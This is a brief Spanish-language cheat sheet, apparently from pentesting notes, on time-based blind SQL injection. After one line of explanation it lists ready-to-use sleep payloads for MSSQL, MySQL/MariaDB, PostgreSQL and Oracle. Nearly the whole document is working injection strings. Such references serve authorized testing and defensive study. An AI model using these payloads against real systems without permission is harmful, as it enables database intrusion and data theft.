### Info

Aplicamos lógica de tiempo en SQL para ver si se inyecta y es validada.

### PAYLOADS

| DB   | payload |
|----------|------|
| MSSQL     | WAITFOR DELAY '0:0:10'  |
| MySQL/MariaDB    | AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')  |
| PostgreSQL    | \|\| (SELECT 1 FROM PG_SLEEP(10))   |
| Oracle    | AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)  |
